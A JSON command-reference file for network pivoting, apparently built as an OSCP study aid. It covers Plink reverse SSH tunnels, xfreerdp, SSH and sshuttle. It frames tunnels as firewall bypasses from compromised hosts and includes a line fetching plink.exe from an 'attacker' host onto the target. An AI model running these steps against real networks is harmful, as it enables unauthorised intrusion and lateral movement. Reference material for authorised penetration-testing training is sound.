{
  "category": "pivoting",
  "commands": [
    {
      "id": "plink-remote-forward",
      "name": "Plink Remote Port Forward",
      "category": "pivoting",
      "subcategory": "ssh-tunneling",
      "command": "plink.exe -ssh -l <SSH_USER> -pw <SSH_PASSWORD> -R <REMOTE_PORT>:<DEST_IP>:<DEST_PORT> <SSH_HOST>",
      "description": "Create reverse SSH tunnel using Plink (PuTTY CLI) on Windows - bypass firewall by initiating connection from compromised host",
      "tags": ["PLINK", "WINDOWS", "SSH", "TUNNELING", "REVERSE_TUNNEL", "PIVOTING", "OSCP:HIGH", "FIREWALL_BYPASS"],
      "variables": [
        {
          "name": "<SSH_USER>",
          "description": "SSH username on attacker's SSH server",
          "example": "kali",
          "required": true
        },
        {
          "name": "<SSH_PASSWORD>",
          "description": "SSH password for authentication (use -i for key file)",
          "example": "kali",
          "required": true
        },
        {
          "name": "<REMOTE_PORT>",
          "description": "Port to bind on SSH server (attacker machine)",
          "example": "9833",
          "required": true
        },
        {
          "name": "<DEST_IP>",
          "description": "Destination IP (from Windows client's perspective)",
          "example": "172.16.50.217",
          "required": true
        },
        {
          "name": "<DEST_PORT>",
          "description": "Destination port to forward to",
          "example": "3389",
          "required": true
        },
        {
          "name": "<SSH_HOST>",
          "description": "SSH server IP address (attacker machine)",
          "example": "192.168.45.x",
          "required": true
        }
      ],
      "flag_explanations": {
        "-ssh": "Force SSH protocol (not Telnet or rlogin)",
        "-l": "Login username for SSH authentication",
        "-pw": "Password for authentication (insecure - visible in process list, use -i for key file)",
        "-R": "Remote port forward - syntax: remote_port:dest_ip:dest_port",
        "-i": "(Alternative) Private key file for authentication instead of password",
        "-N": "(Optional) Do not execute remote command - only creates tunnel"
      },
      "success_indicators": [
        "Using username \"<username>\"",
        "Authenticating with password",
        "Access granted",
        "Remote port forwarding from 0.0.0.0:<REMOTE_PORT>",
        "On SSH server: ss -ntplu shows port <REMOTE_PORT> listening"
      ],
      "failure_indicators": [
        "Connection timed out - SSH server unreachable from Windows client",
        "Access denied - wrong password or username",
        "Remote port forwarding failed - port already in use on SSH server",
        "Network error: Software caused connection abort - firewall blocking outbound SSH"
      ],
      "next_steps": [
        "On SSH server (Kali): Verify listening port: ss -ntplu | grep <REMOTE_PORT>",
        "Test connection from Kali: nc -zv 127.0.0.1 <REMOTE_PORT>",
        "Access forwarded service: xfreerdp /v:127.0.0.1:<REMOTE_PORT> (if forwarding RDP)",
        "Keep Plink window open (closing terminates tunnel)",
        "For background execution: Use cmd.exe /c start /B plink.exe ..."
      ],
      "alternatives": [
        "ssh-remote-port-forward - If OpenSSH client available on Windows (1803+)",
        "netsh-portproxy-add - Native Windows port forwarding (requires admin)",
        "chisel - HTTP tunneling if SSH blocked",
        "socat-port-forward - Simple relay without authentication"
      ],
      "prerequisites": [
        "Plink.exe uploaded to Windows target: powershell wget http://attacker/plink.exe -O plink.exe",
        "SSH server running on attacker machine: sudo systemctl start ssh",
        "Firewall allows outbound SSH from Windows: Test-NetConnection <SSH_HOST> -Port 22",
        "Password authentication enabled: PasswordAuthentication yes in sshd_config"
      ],
      "troubleshooting": {
        "Plink not found": "Download Plink: powershell wget https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe -O plink.exe, or use certutil: certutil -urlcache -f https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe plink.exe",
        "Store key in cache warning": "Answer 'y' to trust SSH server key fingerprint (first connection only)",
        "Remote port forwarding failed for listen port": "Port already in use on SSH server - choose different port or kill conflicting process: lsof -ti:PORT | xargs kill -9",
        "Plink window closes immediately": "Add cmd.exe pause or run interactively to see error messages"
      },
      "notes": "Plink is PuTTY's command-line interface - ideal for Windows hosts without OpenSSH. Unlike OpenSSH's ssh.exe, Plink supports password on command line with -pw (bad OPSEC but useful for scripts). Critical OSCP technique: Reverse tunnel allows pivot through firewall blocking inbound connections. Alternative authentication: Use -i <keyfile.ppk> for Putty private key (convert from OpenSSH with puttygen). Production: Use SSH keys, not passwords. Time estimate: 3-5 minutes including file transfer.",
      "oscp_relevance": "high"
    },
    {
      "id": "xfreerdp-connect",
      "name": "xFreeRDP Connection",
      "category": "pivoting",
      "subcategory": "remote-access",
      "command": "xfreerdp /v:<TARGET>:<PORT> /u:<USERNAME> /p:<PASSWORD> /cert-ignore +clipboard",
      "description": "Connect to Windows RDP server with xFreeRDP - supports clipboard sharing and certificate bypass",
      "tags": ["RDP", "REMOTE_ACCESS", "WINDOWS", "OSCP:HIGH", "XFREERDP"],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP address or hostname",
          "example": "192.168.50.63",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "RDP port (default 3389)",
          "example": "3389",
          "required": false
        },
        {
          "name": "<USERNAME>",
          "description": "Windows username for authentication",
          "example": "rdp_admin",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Password for RDP authentication",
          "example": "P@ssw0rd!",
          "required": true
        }
      ],
      "flag_explanations": {
        "/v:": "Target server and port (syntax: ip:port)",
        "/u:": "Username for authentication",
        "/p:": "Password for authentication (visible in process list)",
        "/cert-ignore": "Ignore certificate verification errors (self-signed certs)",
        "+clipboard": "Enable clipboard sharing between local and remote",
        "/size:": "(Optional) Screen size - e.g., /size:1920x1080 or /size:1280x720",
        "/f": "(Optional) Fullscreen mode",
        "+drive:share,/path": "(Optional) Share local directory - accessible as \\\\tsclient\\share"
      },
      "success_indicators": [
        "Loading rdp connection window",
        "Windows login screen or desktop appears",
        "Clipboard sharing functional (copy/paste works)",
        "Shared drives visible in remote session"
      ],
      "failure_indicators": [
        "Connection failed - RDP service not running or firewall blocking",
        "Authentication failure - wrong credentials",
        "Certificate verification failed - use /cert-ignore flag",
        "CredSSP encryption error - downgrade CredSSP with /sec:rdp or update system"
      ],
      "next_steps": [
        "Open cmd.exe or PowerShell in RDP session",
        "Transfer files via clipboard or shared drive: +drive:share,/tmp",
        "Check user privileges: whoami /priv",
        "Enumerate network interfaces: ipconfig /all",
        "Set up port forwarding if multi-homed: ssh.exe, plink, or netsh"
      ],
      "alternatives": [
        "rdesktop - Older RDP client (less feature-rich)",
        "remmina - GUI RDP client for Linux",
        "microsoft-rdp - Windows built-in RDP client (mstsc.exe)",
        "evil-winrm - If WinRM (5985/5986) available instead of RDP"
      ],
      "prerequisites": [
        "RDP service running on target: nmap -p 3389 -Pn <TARGET>",
        "Valid credentials obtained (password, hash, or token)",
        "xfreerdp installed: sudo apt install freerdp2-x11"
      ],
      "troubleshooting": {
        "Connection timeout": "Verify RDP port open: sudo nmap -p <PORT> -Pn -v <TARGET>, check firewall rules",
        "CredSSP encryption oracle remediation": "Downgrade security: xfreerdp /v:<TARGET> /u:<USER> /p:<PASS> /cert-ignore /sec:rdp",
        "Certificate verify failed": "Always use /cert-ignore flag for self-signed certs in OSCP environments",
        "Clipboard not working": "Ensure +clipboard flag present, some Windows policies disable clipboard sharing"
      },
      "notes": "xFreeRDP is the standard Linux RDP client for OSCP. Clipboard sharing critical for file transfer when no other options available. Drive sharing with +drive:share,/path mounts local directory as \\\\tsclient\\share in Windows - alternative to SMB/HTTP servers. Common OSCP pattern: RDP into dual-homed Windows host, then set up SSH/Plink tunnel to access internal network. Time estimate: 1-2 minutes for connection.",
      "oscp_relevance": "high"
    },
    {
      "id": "ssh-connect",
      "name": "SSH Connection",
      "category": "pivoting",
      "subcategory": "ssh-tunneling",
      "command": "ssh <SSH_USER>@<SSH_HOST>",
      "description": "Basic SSH connection to remote host - interactive shell access",
      "tags": ["SSH", "REMOTE_ACCESS", "OSCP:HIGH"],
      "variables": [
        {
          "name": "<SSH_USER>",
          "description": "SSH username for authentication",
          "example": "database_admin",
          "required": true
        },
        {
          "name": "<SSH_HOST>",
          "description": "SSH server IP address or hostname",
          "example": "10.4.50.215",
          "required": true
        }
      ],
      "flag_explanations": {
        "-p": "Specify custom SSH port (default 22) - e.g., ssh -p 2222 user@host",
        "-i": "Use private key file for authentication - e.g., ssh -i id_rsa user@host",
        "-v": "Verbose mode for debugging connection issues",
        "-o": "Set SSH options - e.g., -o StrictHostKeyChecking=no to skip host key verification"
      },
      "success_indicators": [
        "Interactive shell prompt appears",
        "Command execution works (ls, pwd, whoami)",
        "No password prompts if using key authentication"
      ],
      "failure_indicators": [
        "Connection refused - SSH service not running or firewall blocking",
        "Permission denied - wrong credentials or key",
        "Timeout - network unreachable or incorrect IP"
      ],
      "alternatives": [
        "ssh-local-port-forward - SSH with port forwarding",
        "plink-remote-forward - Windows SSH client alternative"
      ],
      "prerequisites": [
        "SSH service running on target: sudo nmap -p 22 -Pn <SSH_HOST>",
        "Valid credentials or SSH key"
      ],
      "troubleshooting": {
        "Host key verification failed": "Remove old key: ssh-keygen -R <SSH_HOST>, or skip check: ssh -o StrictHostKeyChecking=no user@host",
        "Permission denied (publickey)": "Ensure key permissions: chmod 600 id_rsa, or use password auth: ssh -o PubkeyAuthentication=no user@host",
        "Connection timeout": "Verify SSH port: sudo nmap -p 22 -Pn -v <SSH_HOST>"
      },
      "notes": "Basic SSH connection used as foundation for tunneling techniques. OSCP pattern: SSH into pivot host first, then set up port forwards for internal services.",
      "oscp_relevance": "high"
    },
    {
      "id": "ssh-version",
      "name": "SSH Version Check",
      "category": "pivoting",
      "subcategory": "ssh-tunneling",
      "command": "ssh -V",
      "description": "Display OpenSSH client version - check compatibility for remote dynamic forwarding (requires ≥7.6)",
      "tags": ["SSH", "ENUMERATION", "OSCP:MEDIUM"],
      "variables": [],
      "flag_explanations": {
        "-V": "Display version information and exit"
      },
      "success_indicators": [
        "OpenSSH version displayed (e.g., OpenSSH_8.2p1)",
        "Version ≥7.6 required for remote dynamic forwarding (-R port only)",
        "Version ≥7.4 required for ProxyJump support"
      ],
      "failure_indicators": [
        "Command not found - SSH client not installed"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {},
      "notes": "Critical check before using ssh-remote-dynamic-port-forward. OpenSSH 7.6+ required for reverse SOCKS proxy. Windows 1803+ includes OpenSSH 8.1+. Most modern Linux has 7.6+.",
      "oscp_relevance": "medium"
    },
    {
      "id": "ssh-debug-verbose",
      "name": "SSH Verbose Debugging",
      "category": "pivoting",
      "subcategory": "ssh-tunneling",
      "command": "ssh -vvv <SSH_USER>@<SSH_HOST>",
      "description": "SSH connection with maximum verbosity - troubleshoot authentication, key exchange, and tunnel issues",
      "tags": ["SSH", "DEBUGGING", "OSCP:MEDIUM"],
      "variables": [
        {
          "name": "<SSH_USER>",
          "description": "SSH username",
          "example": "database_admin",
          "required": true
        },
        {
          "name": "<SSH_HOST>",
          "description": "SSH server IP",
          "example": "10.4.50.215",
          "required": true
        }
      ],
      "flag_explanations": {
        "-v": "Verbose mode (level 1) - basic debugging",
        "-vv": "More verbose (level 2) - detailed connection info",
        "-vvv": "Maximum verbosity (level 3) - full protocol debug including key exchange"
      },
      "success_indicators": [
        "debug1: Authentication succeeded",
        "debug1: Entering interactive session",
        "debug1: Local forwarding listening on...",
        "debug1: Remote forwarding listening on..."
      ],
      "failure_indicators": [
        "debug1: Connection closed by remote host",
        "debug1: No more authentication methods to try",
        "debug1: connect_to <dest> port <port>: failed"
      ],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {},
      "notes": "Use when SSH tunnels fail silently. Verbose output shows: key exchange, authentication attempts, tunnel establishment, connection forwarding. Critical for diagnosing 'port forward works but connection hangs' scenarios.",
      "oscp_relevance": "medium"
    },
    {
      "id": "sshuttle-vpn",
      "name": "SSHuttle VPN over SSH",
      "category": "pivoting",
      "subcategory": "ssh-tunneling",
      "command": "sshuttle -r <SSH_USER>@<SSH_HOST> <SUBNET>/<CIDR> --dns",
      "description": "Create transparent VPN over SSH - route entire subnets through pivot without proxychains",
      "tags": ["SSH", "VPN", "TUNNELING", "PIVOTING", "OSCP:MEDIUM", "SSHUTTLE"],
      "variables": [
        {
          "name": "<SSH_USER>",
          "description": "SSH username on pivot host",
          "example": "database_admin",
          "required": true
        },
        {
          "name": "<SSH_HOST>",
          "description": "SSH server IP (pivot host)",
          "example": "10.4.50.215",
          "required": true
        },
        {
          "name": "<SUBNET>",
          "description": "Internal subnet to route (e.g., 172.16.50.0)",
          "example": "172.16.50.0",
          "required": true
        },
        {
          "name": "<CIDR>",
          "description": "Subnet mask in CIDR notation (e.g., 24 for /24)",
          "example": "24",
          "required": true
        }
      ],
      "flag_explanations": {
        "-r": "Remote SSH server (pivot point) - syntax: user@host[:port]",
        "--dns": "Forward DNS queries through tunnel (prevents DNS leaks)",
        "-x": "(Optional) Exclude subnet - e.g., -x 172.16.50.215/32 to exclude pivot itself",
        "-vv": "(Optional) Verbose output for debugging",
        "--no-latency-control": "(Optional) Disable latency optimization for speed"
      },
      "success_indicators": [
        "Connected to server",
        "c : Connected",
        "Direct access to internal IPs without proxychains",
        "ip route shows new routes through tun0 interface"
      ],
      "failure_indicators": [
        "NAT traversal failed - check firewall rules",
        "Permission denied - SSH authentication failed",
        "Fatal: server died - Python not available on pivot host"
      ],
      "next_steps": [
        "Verify routing: ip route | grep tun",
        "Test connectivity: ping <INTERNAL_IP>",
        "Scan internal network: nmap -sT <INTERNAL_SUBNET>/24 (no proxychains needed)",
        "Access services directly: psql -h <INTERNAL_IP>, smbclient //<INTERNAL_IP>/share"
      ],
      "alternatives": [
        "ssh-dynamic-port-forward - SOCKS proxy with proxychains (more flexible)",
        "ssh-local-port-forward - Single service forwarding (simpler)",
        "openvpn - Full VPN solution (requires server setup)"
      ],
      "prerequisites": [
        "SSHuttle installed on attack machine: sudo apt install sshuttle",
        "Python available on pivot host: which python3 (usually present by default)",
        "SSH access to pivot host with valid credentials",
        "Pivot host can route to internal subnet: verify with ip route on pivot"
      ],
      "troubleshooting": {
        "server died with error code 127": "Python not found on pivot - install python3 or use alternative tunneling",
        "NAT traversal failed": "Requires iptables FORWARD rules - may need sudo on pivot or use ssh-dynamic-port-forward instead",
        "Routes disappear after disconnect": "SSHuttle removes routes on exit - keep terminal open or use screen/tmux",
        "Very slow performance": "Add --no-latency-control flag, or exclude pivot IP with -x to prevent routing loops"
      },
      "notes": "SSHuttle creates transparent proxy - tools work normally without proxychains prefix. Advantage over SOCKS: UDP support, transparent to applications, easier syntax. Disadvantage: Requires Python on pivot, modifies local routing table (iptables), less stealthy than SOCKS. OSCP use case: When proxychains causes issues with specific tools (e.g., Metasploit, Responder). Time estimate: 2-3 minutes for setup, ~30 seconds per subnet route.",
      "oscp_relevance": "medium"
    }
  ]
}
